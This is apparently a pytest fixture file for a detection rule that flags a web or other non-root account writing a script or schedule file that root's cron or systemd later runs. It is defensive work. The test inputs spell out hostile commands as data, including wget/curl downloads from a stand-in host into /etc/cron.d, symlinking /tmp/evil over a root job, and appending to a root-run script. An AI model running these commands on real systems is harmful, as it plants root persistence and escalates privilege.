"""Fixtures for the non-root-write / root-run rule. Hosts, accounts and paths are invented; addresses are not used."""
import random
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect.context import classify_discovery
from romulus.detect.hijack import NonRootWriteRootExecutedFile, path_key, schedule_config
from romulus.detect.linux_argv import write_targets
from romulus.detect.registry import ALL_PLAYBOOKS, fresh_pack
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2030, 1, 6, 9, 0, tzinfo=UTC)
JOB = "/srv/tasks/rotate.sh"
_n = 0


def ev(family, ts, outcome=Outcome.success, host="app01", **fields):
    global _n
    _n += 1
    f = {k.replace("__", "."): fv(v, f"fixture{_n}:{k}") for k, v in fields.items() if v is not None}
    return TypedEvent(id=f"h{_n:05d}", family=family, ts=ts, host=host, outcome=outcome, fields=f,
                      raw=[RawRef(target="fx", native_id=f"r{_n}")], normalizer="fixture")


def ex(argv, exe, uid, ts, user=None, auid=None, ses=None, pid=None, ppid=None, cwd=None, euid=None,
       outcome=Outcome.success, host="app01"):
    names = {"0": "root", "33": "www-data", "1000": "alice", "1001": "bob"}
    if user is None and uid is not None:
        user = names.get(str(uid))
    return ev("process_exec", ts, outcome=outcome, host=host, process__argv=argv, process__executable=exe,
              process__uid=None if uid is None else str(uid), process__user=user,
              process__auid=None if auid is None else str(auid), process__session_id=ses, process__pid=pid,
              process__ppid=ppid, process__cwd=cwd, process__euid=None if euid is None else str(euid))


def web(argv, exe, ts=T0, **kw):
    kw.setdefault("cwd", "/var/www/html")
    return ex(argv, exe, 33, ts, pid=4000, ppid=3999, **kw)


def cron_open(ts, ses=12, pid=5000, host="app01", service="cron"):
    return ev("auth", ts, host=host, auth__service=service, auth__phase="session_open", process__session_id=ses,
              process__pid=pid, user__name="root", process__auid="0")


def cron_runs(ts, path=JOB, ses=12, pid=5000, host="app01"):
    """A root cron job: session open, `sh -c PATH`, then the script under bash (the #! interpreter)."""
    return [cron_open(ts, ses, pid, host),
            ex(["/bin/sh", "-c", path], "/usr/bin/dash", 0, ts + timedelta(seconds=1), auid=0, ses=ses,
               pid=pid + 1, ppid=pid, cwd="/root", host=host),
            ex(["/bin/bash", path], "/usr/bin/bash", 0, ts + timedelta(seconds=1, milliseconds=5), auid=0, ses=ses,
               pid=pid + 1, ppid=pid, cwd="/root", host=host)]


def run(*partitions):
    pb = NonRootWriteRootExecutedFile()
    store = {}
    for part in partitions:
        assert pb.consume(list(part)) == []
        for event in pb.drain_staged():
            store[event.id] = event
    pb.bind_loader(lambda ids: [store[i] for i in ids if i in store])
    return pb, pb.finalize()


VI = (["vi", JOB], "/usr/bin/vim.basic")


# ---------------------------------------------------------------- positives
def test_web_account_editor_then_root_cron_run_is_high_and_restrained():
    writer = web(*VI)
    _pb, out = run([writer, *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1
    m = out[0]
    assert m.proposed_lane == "high" and m.severity == "high" and m.confidence == "high"
    assert "'www-data' (uid 33), a web-service account" in m.claim
    assert "the editor 'vi' was started on it" in m.claim
    assert "the scheduler 'cron'" in m.claim and "began after the first write-capable command" in m.claim
    assert "whether the file's content changed is not established" in m.claim
    assert "modified" not in m.claim
    cited = {e.id for e in m.events}
    assert writer.id in cited and any(e.family == "auth" for e in m.events)
    assert "T1053.003" in m.notes
    assert m.group_key == f"app01|www-data|{JOB}"
    assert all(p.origin for p in m.predicate)


@pytest.mark.parametrize("argv,exe,cwd", [
    (["sed", "-i", "s/a/b/", JOB], "/usr/bin/sed", None),
    (["sed", "-ni", "p", JOB], "/usr/bin/sed", None),
    (["sed", "-i.bak", "-e", "1d", JOB], "/usr/bin/sed", None),
    (["sed", "--in-place=.orig", "--expression=1d", JOB], "/usr/bin/sed", None),
    (["sed", "-ie", "1d", JOB], "/usr/bin/sed", None),                 # -i with suffix "e": still in place
    (["tee", "-a", JOB], "/usr/bin/tee", None),
    (["cp", "/tmp/x", JOB], "/usr/bin/cp", None),
    (["cp", "/tmp/rotate.sh", "/srv/tasks/"], "/usr/bin/cp", None),     # destination read as a directory
    (["cp", "-t", "/srv/tasks", "/tmp/rotate.sh"], "/usr/bin/cp", None),
    (["mv", "-f", "/tmp/new", JOB], "/usr/bin/mv", None),
    (["install", "-m", "755", "/tmp/new", JOB], "/usr/bin/install", None),
    (["install", "-m755", "/tmp/new", JOB], "/usr/bin/install", None),
    (["ln", "-sf", "/tmp/evil", JOB], "/usr/bin/ln", None),
    (["chmod", "o+w", JOB], "/usr/bin/chmod", None),
    (["chmod", "-x", JOB], "/usr/bin/chmod", None),
    (["truncate", "-s", "0", JOB], "/usr/bin/truncate", None),
    (["dd", "if=/tmp/x", f"of={JOB}"], "/usr/bin/dd", None),
    (["perl", "-pi", "-e", "s/a/b/", JOB], "/usr/bin/perl", None),
    (["perl", "-i.bak", "-pe", "s/a/b/", JOB], "/usr/bin/perl", None),
    (["curl", "-so", JOB, "http://example.invalid/x"], "/usr/bin/curl", None),
    (["curl", f"--output={JOB}", "http://example.invalid/x"], "/usr/bin/curl", None),
    (["wget", "-qO", JOB, "http://example.invalid/x"], "/usr/bin/wget", None),
    (["nano", "+3", JOB], "/usr/bin/nano", None),
    (["ed", "-s", JOB], "/usr/bin/ed", None),
    (["emacs", f"--file={JOB}"], "/usr/bin/emacs-nox", None),
    (["vim", "rotate.sh"], "/usr/bin/vim.basic", "/srv/tasks"),           # relative, resolved with cwd
    (["scp", "user@example.invalid:x", JOB], "/usr/bin/scp", None),
    (["/bin/sh", "-c", f"echo 'id' >> {JOB}"], "/usr/bin/dash", None),
    (["sh", "-c", "cd /srv/tasks && echo x > rotate.sh"], "/usr/bin/dash", None),
    (["bash", "-c", f"cat /tmp/p | tee {JOB}"], "/usr/bin/bash", None),
    (["busybox", "vi", JOB], "/usr/bin/busybox", None),
])
def test_write_forms_by_web_account_are_found(argv, exe, cwd):
    _pb, out = run([web(argv, exe, cwd=cwd), *cron_runs(T0 + timedelta(minutes=5))])
    assert len(out) == 1, argv
    assert out[0].proposed_lane == "high"


@pytest.mark.parametrize("root_run", [
    ex([JOB], JOB, 0, T0 + timedelta(minutes=5), auid=0, ses=12, pid=5001, ppid=5000),            # exe is the file
    ex(["sh", JOB], "/usr/bin/dash", 0, T0 + timedelta(minutes=5), auid=0, ses=12, pid=5001, ppid=5000),
    ex(["bash", "-c", f"{JOB} --rotate"], "/usr/bin/bash", 0, T0 + timedelta(minutes=5), auid=0, ses=12, pid=5001,
       ppid=5000),
    ex(["sh", "-c", ". /srv/tasks/rotate.sh"], "/usr/bin/dash", 0, T0 + timedelta(minutes=5), auid=0, ses=12,
       pid=5001, ppid=5000),
    ex(["python3", "-u", JOB], "/usr/bin/python3.12", 0, T0 + timedelta(minutes=5), auid=0, ses=12, pid=5001,
       ppid=5000),
])
def test_root_run_forms_in_a_cron_session(root_run):
    _pb, out = run([web(*VI), cron_open(T0 + timedelta(minutes=5)), root_run])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "began after the first write-capable command" in out[0].claim


def test_cron_session_joined_by_parent_pid_when_no_session_id():
    root_run = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5), auid=0, pid=5001, ppid=5000)
    _pb, out = run([web(*VI), cron_open(T0 + timedelta(minutes=5) - timedelta(seconds=1), ses=None), root_run])
    assert "the scheduler 'cron'" in out[0].claim


def test_systemd_unit_run_is_the_service_class():
    unit = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5), pid=700, ppid=1)
    _pb, out = run([web(*VI), unit])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "service manager (pid 1)" in out[0].claim
    assert {"T1053.006", "T1543.002"} <= set(out[0].notes)


def test_systemd_unit_child_reached_through_root_lineage():
    unit = ex(["/bin/sh", "-c", "run-parts /srv/tasks"], "/usr/bin/dash", 0, T0 + timedelta(minutes=5), pid=700,
              ppid=1)
    parts = ex(["run-parts", "/srv/tasks"], "/usr/bin/run-parts", 0, T0 + timedelta(minutes=5, seconds=1), pid=701,
               ppid=700)
    child = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5, seconds=2), pid=702, ppid=701)
    _pb, out = run([web(*VI), unit, parts, child])
    assert "service manager (pid 1)" in out[0].claim


def test_root_daemon_with_unrecorded_launcher_is_still_reported():
    child = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5), pid=702, ppid=650)
    _pb, out = run([web(*VI), child])
    assert len(out) == 1 and "outside any login session" in out[0].claim


def test_other_non_root_account_is_a_lead_with_high_severity():
    writer = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3, pid=900, ppid=899, cwd="/home/alice")
    _pb, out = run([writer, *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1
    assert out[0].proposed_lane == "lead" and out[0].severity == "high"


def test_another_accounts_root_login_running_the_file_is_reported():
    writer = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3, pid=900, ppid=899)
    admin = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1001, ses=9, pid=950, ppid=949)
    _pb, out = run([writer, admin])
    assert len(out) == 1 and "audit login uid 1001" in out[0].claim and out[0].proposed_lane == "lead"


@pytest.mark.parametrize("argv", [["tee", "-a", "/etc/cron.d/sync"], ["vi", "/etc/crontab"],
                                  ["cp", "/tmp/u", "/etc/systemd/system/sync.timer"],
                                  ["sed", "-i", "1d", "/var/spool/cron/crontabs/root"]])
def test_write_to_root_schedule_matches_without_a_root_run(argv):
    exe = {"tee": "/usr/bin/tee", "vi": "/usr/bin/vim.basic", "cp": "/usr/bin/cp", "sed": "/usr/bin/sed"}[argv[0]]
    _pb, out = run([web(argv, exe)])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "which root's scheduler or service manager reads" in out[0].claim
    other = ex(argv, exe, 1000, T0, auid=1000)
    _pb, out = run([other])
    assert len(out) == 1 and out[0].proposed_lane == "lead"


def test_kernel_file_change_proof_and_root_run_after_it_is_urgent_for_a_web_account():
    change = ev("file_change", T0 + timedelta(seconds=30), file__path=JOB, file__change="content", process__uid="33",
                process__user="www-data")
    _pb, out = run([web(*VI), change, *cron_runs(T0 + timedelta(minutes=10))])
    m = out[0]
    assert m.proposed_lane == "urgent"
    assert "A kernel file-change record shows this account opened it for writing" in m.claim
    assert change.id in {e.id for e in m.events}


def test_kernel_proof_raises_another_account_to_high_and_attribute_change_is_not_urgent():
    writer = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, pid=900, ppid=899)
    change = ev("file_change", T0 + timedelta(seconds=30), file__path=JOB, file__change="content",
                process__uid="1000", process__user="alice")
    _pb, out = run([writer, change, *cron_runs(T0 + timedelta(minutes=10))])
    assert out[0].proposed_lane == "high"
    attr = ev("file_change", T0 + timedelta(seconds=30), file__path=JOB, file__change="attributes",
              process__uid="33", process__user="www-data")
    _pb, out = run([web(["chmod", "+x", JOB], "/usr/bin/chmod"), attr, *cron_runs(T0 + timedelta(minutes=10))])
    assert out[0].proposed_lane == "high"


def test_file_change_records_present_but_none_for_this_file_is_worded_so():
    other = ev("file_change", T0, file__path="/tmp/unrelated", file__change="content", process__uid="33",
               process__user="www-data")
    _pb, out = run([web(*VI), other, *cron_runs(T0 + timedelta(minutes=10))])
    assert "No kernel file-change record for this file and account was retrieved" in out[0].claim


def test_root_run_only_before_the_write_keeps_web_high_with_restrained_wording():
    _pb, out = run([*cron_runs(T0 - timedelta(minutes=10)), web(*VI)])
    m = out[0]
    assert m.proposed_lane == "high" and m.confidence == "medium"
    assert "none whose exec did not fail began after the first write-capable command" in m.claim
    assert any("the next run is the risk" in note for note in m.notes)
    other = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000)
    _pb, out = run([*cron_runs(T0 - timedelta(minutes=10)), other])
    assert out[0].proposed_lane == "lead"


def test_timestamp_boundary_same_instant_is_not_after_and_one_microsecond_is():
    same = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0, pid=700, ppid=1)
    _pb, out = run([web(*VI), same])
    assert "none whose exec did not fail began after" in out[0].claim and out[0].confidence == "medium"
    later = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(microseconds=1), pid=700, ppid=1)
    _pb, out = run([web(*VI), later])
    assert "1 of them began after" in out[0].claim and out[0].confidence == "high"


def test_write_and_run_in_different_partitions_and_resumed_rereads_count_once():
    writer = web(*VI)
    runs = cron_runs(T0 + timedelta(minutes=10))
    _pb, out = run([writer], [writer], runs, runs)
    assert len(out) == 1
    assert "ran a write-capable command on" in out[0].claim
    assert "2 root exec record(s) in the window execute /srv/tasks/rotate.sh" in out[0].claim


def test_out_of_order_partitions_still_count_the_later_run_and_say_its_record_is_not_cited():
    runs = cron_runs(T0 + timedelta(minutes=10))
    _pb, out = run(runs, [web(*VI)])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert "began after the first write-capable command (the record of the first of them is not among" in out[0].claim


def test_failed_writer_exec_is_lowered_to_lead_never_dropped():
    _pb, out = run([web(*VI, outcome=Outcome.failure), *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1 and out[0].proposed_lane == "lead"
    assert "1 failed" in out[0].claim


def test_failed_root_runs_are_not_counted_as_runs_after_the_write():
    failed = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5), pid=700, ppid=1,
                outcome=Outcome.failure)
    _pb, out = run([web(*VI), failed])
    assert "1 of them recorded a failed exec" in out[0].claim
    assert "none whose exec did not fail began after" in out[0].claim


def test_usr_merge_aliases_join():
    writer = web(["cp", "/tmp/x", "/bin/report-sync"], "/usr/bin/cp")
    root = ex(["/usr/bin/report-sync"], "/usr/bin/report-sync", 0, T0 + timedelta(minutes=1), pid=700, ppid=1)
    _pb, out = run([writer, root])
    assert len(out) == 1 and path_key("/bin/report-sync") == "/usr/bin/report-sync"


def test_output_is_deterministic_under_input_order():
    events = [web(*VI), web(["tee", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=5)),
              ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0 + timedelta(seconds=7), auid=1000),
              *cron_runs(T0 + timedelta(minutes=10))]
    baseline = [(m.group_key, m.claim, m.proposed_lane, [e.id for e in m.events]) for m in run(events)[1]]
    for seed in range(5):
        shuffled = list(events)
        random.Random(seed).shuffle(shuffled)
        again = [(m.group_key, m.claim, m.proposed_lane, [e.id for e in m.events]) for m in run(shuffled)[1]]
        assert again == baseline
    assert len(baseline) == 2


def test_many_writes_cite_the_earliest_and_give_exact_totals():
    writes = [web(["tee", "-a", JOB], "/usr/bin/tee", ts=T0 + timedelta(seconds=i)) for i in range(25)]
    _pb, out = run([*writes, *cron_runs(T0 + timedelta(minutes=10))])
    assert "ran 25 write-capable commands" in out[0].claim and "The earliest 10" in out[0].claim


# ---------------------------------------------------------------- hard negatives
def test_root_admin_editing_own_script_is_not_matched():
    admin = ex(["vi", JOB], "/usr/bin/vim.basic", 0, T0, auid=1000, ses=4)
    assert run([admin, *cron_runs(T0 + timedelta(minutes=10))])[1] == []


def test_sudo_editor_is_root_and_tool_name_in_a_parents_arguments_is_not_a_write():
    sudo = ex(["sudo", "vi", JOB], "/usr/bin/sudo", 1000, T0, auid=1000, euid=0)
    child = ex(["vi", JOB], "/usr/bin/vim.basic", 0, T0 + timedelta(milliseconds=5), auid=1000)
    assert run([sudo, child, *cron_runs(T0 + timedelta(minutes=10))])[1] == []


def test_web_account_editing_a_file_no_root_process_runs_is_not_matched():
    writer = web(["vi", "/var/www/html/index.php"], "/usr/bin/vim.basic")
    assert run([writer, *cron_runs(T0 + timedelta(minutes=10))])[1] == []


def test_same_basename_in_another_directory_is_not_matched():
    writer = web(["vi", "/var/www/html/rotate.sh"], "/usr/bin/vim.basic")
    assert run([writer, *cron_runs(T0 + timedelta(minutes=10))])[1] == []


@pytest.mark.parametrize("argv,exe", [
    (["cat", JOB], "/usr/bin/cat"), (["less", JOB], "/usr/bin/less"), (["grep", "-n", "rm", JOB], "/usr/bin/grep"),
    (["view", JOB], "/usr/bin/vim.basic"), (["vi", "-R", JOB], "/usr/bin/vim.basic"),
    (["nano", "-v", JOB], "/usr/bin/nano"), (["sed", "-n", "1p", JOB], "/usr/bin/sed"),
    (["perl", "-ne", "print", JOB], "/usr/bin/perl"), (["cp", JOB, "/tmp/copy"], "/usr/bin/cp"),
    (["grep", JOB, "/var/log/syslog"], "/usr/bin/grep"), (["echo", JOB], "/usr/bin/echo"),
    (["sh", "-c", f"echo {JOB}"], "/usr/bin/dash"), (["sh", "-c", f"grep -c x {JOB} > /tmp/count"], "/usr/bin/dash"),
    (["curl", "-s", f"http://siem.invalid/api?q=process.args:{JOB}"], "/usr/bin/curl"),
    (["dpkg", "-L", "cron"], "/usr/bin/dpkg"), (["man", "vi"], "/usr/bin/man"),
    (["wget", "-O", "-", "http://example.invalid/x"], "/usr/bin/wget"),
    (["tee", "/dev/null"], "/usr/bin/tee"),
    (["sh", "-c", f"sudo tee {JOB}"], "/usr/bin/dash"),
    (["ls", "/usr/share/vim/vim91/"], "/usr/bin/ls"),                               # tool name in a path
    (["sed-wrapper", "-i", JOB], "/usr/local/bin/sed-wrapper"),                    # not sed by kernel identity
    (["vi"], "/usr/bin/vim.basic"),                                                 # editor with no file
])
def test_reads_mentions_and_lookalikes_are_not_writes(argv, exe):
    assert run([web(argv, exe), *cron_runs(T0 + timedelta(minutes=10))])[1] == []


def test_writer_elevating_own_file_in_own_login_is_not_matched():
    writer = ex(["vi", "/home/alice/deploy.sh"], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3)
    elevated = ex(["/bin/bash", "/home/alice/deploy.sh"], "/usr/bin/bash", 0, T0 + timedelta(minutes=1), auid=1000,
                  ses=3, pid=990, ppid=989)
    out = run([writer, elevated])[1]
    assert len(out) == 1 and out[0].proposed_lane == "lead" and "the writer's own elevation" in out[0].claim


def test_own_elevation_only_leads_are_one_lead_per_host_and_writer():
    # configuration management: the remote account writes one-off modules, then runs each with privilege escalation
    out_files = [f"/home/deploy/.ansible/tmp/ansible-tmp-{i}/AnsiballZ_mod.py" for i in range(12)]
    records = []
    for i, path in enumerate(out_files):
        ts = T0 + timedelta(minutes=i)
        records.append(ex(["cp", "/tmp/m", path], "/usr/bin/cp", 1001, ts, user="deploy", auid=1001, ses=5,
                          pid=700 + i, ppid=699))
        records.append(ex(["/usr/bin/python3", path], "/usr/bin/python3.11", 0, ts + timedelta(seconds=2), auid=1001,
                          ses=5, pid=800 + i, ppid=799))
    other = ex(["vi", JOB], "/usr/bin/vim.basic", 1001, T0, user="deploy", auid=1001, ses=5, pid=900, ppid=899)
    _pb, out = run([*records, other, *cron_runs(T0 + timedelta(hours=1))])
    keys = sorted(m.group_key for m in out)
    assert keys == ["app01|deploy|/srv/tasks/rotate.sh", "app01|deploy|own-elevation"]
    m = next(m for m in out if m.group_key.endswith("own-elevation"))
    assert m.proposed_lane == "lead" and " wrote " not in m.claim
    assert "ran write-capable commands on, or changed (per kernel records), 12 files in 12 director(ies)" in m.claim
    assert "and 2 more (every path is in the notes)" in m.claim and len(m.events) == 10
    assert {f"file: {p}" for p in out_files} <= set(m.notes) and "T1548.003" in m.notes
    assert len({e.id for e in m.events}) == 10 and all(e.get("process.uid") == "1001" for e in m.events)
    # the stated span ends on the latest file's write, which is cited although it is past the cap of files in order
    from tests.claim_citations import finding_problems
    last_write = max((r for r in records if r.get("process.uid") == "1001"), key=lambda e: e.ts)
    assert last_write.id in {e.id for e in m.events} and f"to {last_write.ts.isoformat()}" in m.claim
    assert "The first record of 10 of the 12 files is cited, the earliest and the latest file among them." in m.claim
    assert not finding_problems(m.claim, m.notes, m.events)


def _managed(host, n, start=T0, pid=700, base="/home/deploy/.ansible/tmp"):
    """Configuration management on one host: the remote account writes one-off modules into per-run directories
    and runs each through its own privilege escalation."""
    records = []
    for i in range(n):
        ts = start + timedelta(minutes=i)
        path = f"{base}/run-{host}-{i}/mod_{i}.py"
        records.append(ex(["cp", "/tmp/m", path], "/usr/bin/cp", 1001, ts, user="deploy", auid=1001, ses=5,
                          pid=pid + i, ppid=pid - 1, host=host))
        records.append(ex(["/usr/bin/python3", path], "/usr/bin/python3.11", 0, ts + timedelta(seconds=2), auid=1001,
                          ses=5, pid=pid + 100 + i, ppid=pid + 99, host=host))
    return records


def test_own_elevation_leads_of_one_account_and_layout_on_several_hosts_are_one_lead():
    hosts = ("app01", "app02", "db01")
    records = [r for k, host in enumerate(hosts) for r in _managed(host, 4, start=T0 + timedelta(hours=k))]
    _pb, out = run(records)
    assert len(out) == 1
    m = out[0]
    assert m.proposed_lane == "lead" and m.severity == "high"
    assert m.group_key == "app01+app02+db01|deploy|own-elevation"
    assert m.claim.startswith(
        "Across 3 hosts, account 'deploy' (an account of that name on each host) ran write-capable commands on, or "
        "changed (per kernel records), 12 files (app01: 4, app02: 4, db01: 4), all in per-run directories under "
        "/home/deploy/.ansible/tmp")
    assert "under /home/deploy/.ansible/tmp" in m.claim and "on its own host" in m.claim
    assert {e.host for e in m.events} == set(hosts) and len(m.events) == 10
    assert {f"file: {h}:/home/deploy/.ansible/tmp/run-{h}-{i}/mod_{i}.py" for h in hosts for i in range(4)} <= set(
        m.notes)
    assert {("host", h, "host") for h in hosts} <= set(m.entities) and "T1548.003" in m.notes


def test_a_cross_host_lead_cites_and_names_every_host_beyond_the_citation_cap():
    hosts = [f"node{i:02d}" for i in range(14)]
    records = [r for k, host in enumerate(hosts) for r in _managed(host, 2, start=T0 + timedelta(minutes=5 * k))]
    [m] = run(records)[1]
    assert {e.host for e in m.events} == set(hosts)
    assert {("host", h, "host") for h in hosts} <= set(m.entities)
    assert "28 files" in m.claim and "and 18 more (every host and path is in the notes)" in m.claim


def test_a_different_layout_or_account_on_another_host_stays_its_own_lead():
    records = _managed("app01", 3) + _managed("app02", 3)
    records += _managed("db01", 2, base="/opt/jobs")                 # the same account, another layout
    alice = [ex(["vi", "/home/alice/fix.sh"], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3, host="app03"),
             ex(["/bin/bash", "/home/alice/fix.sh"], "/usr/bin/bash", 0, T0 + timedelta(minutes=1), auid=1000, ses=3,
                pid=990, ppid=989, host="app03")]
    _pb, out = run([*records, *alice])
    assert sorted(m.group_key for m in out) == ["app01+app02|deploy|own-elevation", "app03|alice|/home/alice/fix.sh",
                                                "db01|deploy|own-elevation"]
    assert all(m.proposed_lane == "lead" for m in out)


def test_another_hosts_root_job_does_not_join():
    writer = web(*VI)
    assert run([writer, *cron_runs(T0 + timedelta(minutes=10), host="db01")])[1] == []


# ---------------------------------------------------------------- the writer's own elevation: never via inherited auid
def test_web_daemon_with_inherited_root_auid_is_reported_for_a_root_cron_run():
    # (a) apache started from a root login: www-data inherits auid 0, and root's cron session also has auid 0
    writer = web(*VI, auid=0, ses=5)
    _pb, out = run([writer, *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1 and out[0].proposed_lane == "high"


def test_web_daemon_with_inherited_root_auid_is_reported_for_a_root_login_run():
    # (b) the same writer, then a root login (auid 0, a new session) runs the file
    writer = web(*VI, auid=0, ses=5)
    login = ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=50, pid=950, ppid=949)
    _pb, out = run([writer, login])
    assert len(out) == 1 and out[0].proposed_lane == "high" and "audit login uid 0" in out[0].claim


def test_web_daemon_restarted_by_an_admin_is_reported_for_that_admins_sudo_run():
    # (c) `sudo apachectl restart` by admin 1000: www-data inherits auid 1000; the admin later runs the file with sudo
    writer = web(*VI, auid=1000, ses=12)
    sudo_run = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=77, pid=950,
                  ppid=949)
    _pb, out = run([writer, sudo_run])
    assert len(out) == 1 and out[0].proposed_lane == "high"


def test_web_writer_is_never_excluded_even_in_the_same_session():
    writer = web(*VI, auid=1000, ses=12)
    same = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=12, pid=950, ppid=949)
    assert len(run([writer, same])[1]) == 1


def test_non_web_writer_excluded_only_by_own_session_or_own_uid():
    alice = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3, pid=900, ppid=899)
    # her own uid as the login uid of a root run in another session: her own sudo
    own_sudo = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=1000, ses=9, pid=950, ppid=949)
    assert [m.proposed_lane for m in run([alice, own_sudo])[1]] == ["lead"]
    # a process of hers that inherited auid 0 does not make root's logins hers
    inherited = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=0, ses=4, pid=900, ppid=899)
    root_login = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=60, pid=950, ppid=949)
    assert len(run([inherited, root_login])[1]) == 1
    # ... but a root run inside that very audit session is her own elevation
    same_session = ex(["bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=3), auid=0, ses=4, pid=950, ppid=949)
    assert [m.proposed_lane for m in run([inherited, same_session])[1]] == ["lead"]


def test_scheduler_session_excluded_only_when_it_is_the_writers_own_crontab():
    alice = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=1000, ses=3)
    own_cron = [ev("auth", T0 + timedelta(minutes=5), auth__service="cron", auth__phase="session_open",
                   process__session_id=40, process__pid=6000, user__name="alice", process__auid="1000"),
                ex(["sudo", JOB], "/usr/bin/sudo", 1000, T0 + timedelta(minutes=5, seconds=1), auid=1000, ses=40,
                   euid=0, pid=6001, ppid=6000),
                ex(["/bin/bash", JOB], "/usr/bin/bash", 0, T0 + timedelta(minutes=5, seconds=2), auid=1000, ses=40,
                   pid=6002, ppid=6001)]
    assert [m.proposed_lane for m in run([alice, *own_cron])[1]] == ["lead"]
    inherited = ex(["vi", JOB], "/usr/bin/vim.basic", 1000, T0, auid=0, ses=3)    # root's cron is never hers
    assert len(run([inherited, *cron_runs(T0 + timedelta(minutes=10))])[1]) == 1


def test_setuid_root_writer_is_root_not_a_non_root_writer():
    # real uid 1000, effective uid 0: the write is made as root, so it is not this behaviour
    setuid = ex(["tee", JOB], "/usr/local/bin/tee", 1000, T0, auid=1000, euid=0)
    assert run([setuid, *cron_runs(T0 + timedelta(minutes=10))])[1] == []


# ---------------------------------------------------------------- writes into a schedule directory
@pytest.mark.parametrize("argv,exe,cwd,written", [
    (["cp", "/tmp/evil", "/etc/cron.d"], "/usr/bin/cp", None, "/etc/cron.d/evil"),
    (["mv", "/tmp/evil.service", "/etc/systemd/system"], "/usr/bin/mv", None, "/etc/systemd/system/evil.service"),
    (["install", "-m", "644", "/tmp/evil", "/etc/cron.d"], "/usr/bin/install", None, "/etc/cron.d/evil"),
    (["ln", "-s", "/tmp/evil", "/etc/cron.hourly"], "/usr/bin/ln", None, "/etc/cron.hourly/evil"),
    (["sh", "-c", "cd /etc/cron.d && cp /tmp/evil ."], "/usr/bin/dash", None, "/etc/cron.d/evil"),
    (["cp", "/tmp/evil", "."], "/usr/bin/cp", "/etc/cron.d", "/etc/cron.d/evil"),
    (["rsync", "/tmp/evil", "/etc/cron.d/"], "/usr/bin/rsync", None, "/etc/cron.d/evil"),
    (["rsync", "-a", "/tmp/evil", "/etc/cron.d"], "/usr/bin/rsync", None, "/etc/cron.d/evil"),
    (["scp", "user@example.invalid:evil", "/etc/cron.d/"], "/usr/bin/scp", None, "/etc/cron.d/evil"),
    (["wget", "-P", "/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None, "/etc/cron.d/evil"),
    (["wget", "-qP", "/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None, "/etc/cron.d/evil"),
    (["wget", "--directory-prefix=/etc/cron.d", "http://example.invalid/evil"], "/usr/bin/wget", None,
     "/etc/cron.d/evil"),
    (["sh", "-c", "cd /etc/cron.d && wget http://example.invalid/evil"], "/usr/bin/dash", None, "/etc/cron.d/evil"),
    (["curl", "-sO", "http://example.invalid/evil"], "/usr/bin/curl", "/etc/cron.d", "/etc/cron.d/evil"),
    (["curl", "--remote-name", "http://example.invalid/evil"], "/usr/bin/curl", "/etc/cron.d", "/etc/cron.d/evil"),
    (["curl", "--output-dir", "/etc/cron.d", "-O", "http://example.invalid/evil"], "/usr/bin/curl", None,
     "/etc/cron.d/evil"),
])
def test_web_writes_into_a_schedule_directory_are_found(argv, exe, cwd, written):
    _pb, out = run([web(argv, exe, cwd=cwd)])
    assert len(out) == 1, argv
    assert out[0].proposed_lane == "high" and f"on {written} " in out[0].claim


def test_downloads_without_a_file_name_or_to_stdout_are_not_writes():
    assert run([web(["curl", "-s", "http://example.invalid/evil"], "/usr/bin/curl", cwd="/etc/cron.d")])[1] == []
    assert run([web(["wget", "-O", "-", "http://example.invalid/evil"], "/usr/bin/wget", cwd="/etc/cron.d")])[1] == []
    pb, out = run([web(["wget", "http://example.invalid/evil"], "/usr/bin/wget", cwd=None)])
    assert out == [] and pb.missing_required == 1          # the download's directory is unknown: partial


def test_editor_with_stderr_dup_now_parses_and_the_write_is_found():
    # `2>&1` used to make the whole script unevaluable; the editor write on JOB is now recovered.
    _pb, out = run([web(["sh", "-c", f"vi {JOB} 2>&1 | true"], "/usr/bin/dash"), *cron_runs(T0 + timedelta(minutes=10))])
    assert len(out) == 1 and out[0].proposed_lane == "high"
    assert f"on {JOB} " in out[0].claim and "the editor 'vi'" in out[0].claim


def test_unmodelled_editor_redirect_text_is_counted_partial():
